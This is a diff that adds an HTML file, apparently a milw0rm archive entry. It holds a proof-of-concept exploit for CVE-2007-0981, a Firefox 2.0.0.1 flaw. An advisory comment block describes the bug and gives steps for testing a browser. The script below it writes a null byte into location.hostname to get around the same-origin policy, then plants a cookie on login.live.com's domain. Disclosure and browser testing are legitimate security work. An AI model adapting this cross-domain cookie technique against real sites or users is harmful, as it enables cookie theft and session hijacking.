@@ -1,0 +1,49 @@
+<!--
+________________________________________________________________________________
+  
+Mozilla Firefox 'location.hostname' Cross-Domain Vulnerability
+________________________________________________________________________________
+
+Software      : Mozilla Firefox version 2.0.0.1 and prior 
+CVE reference : CVE-2007-0981
+Impact        : Security Bypass
+Risk          : Moderate
+Discovered by : Michal Zalewski (http://lcamtuf.coredump.cx/)
+Advisory Date	: 2007-02-15
+
+Mozilla Firefox allows remote attackers to bypass the same origin policy, steal
+cookies, and conduct other attacks by writing a URI with a null byte to the
+hostname (location.hostname) DOM property, due to interactions with DNS
+resolver code.
+
+Links
+http://lcamtuf.dione.cc/ffhostname.html (test)
+https://bugzilla.mozilla.org/show_bug.cgi?id=370445
+________________________________________________________________________________
+
+How To Test Your Browser ?
+1 - Execute this on your local web server (or change variable 'mydomain')
+2 - Go to the link 'http://login.live.com/' and read the login
+    (or check Tools -> Options -> Privacy -> Show Cookies for login.live.com)
+________________________________________________________________________________
+
+Gorn, gorn.support[gmail]com
+2007-02-19 16:00
+
+-->
+
+<script language="javascript"> 
+var mydomain = '127.0.0.1';
+var var_cook = 'MSPPre=firefox_vulnerability_test';
+var dom_cook = 'login.live.com';
+
+if (location.hostname == mydomain)
+{
+  try { location.hostname = mydomain + '\x00www.' + dom_cook; } 
+  catch (err) { alert('Failed to modify location.hostname'); }
+} else {
+  document.cookie = var_cook + '; domain=.' + dom_cook + '; path=/;';  
+}
+</script>
+
+# milw0rm.com [2007-02-20]
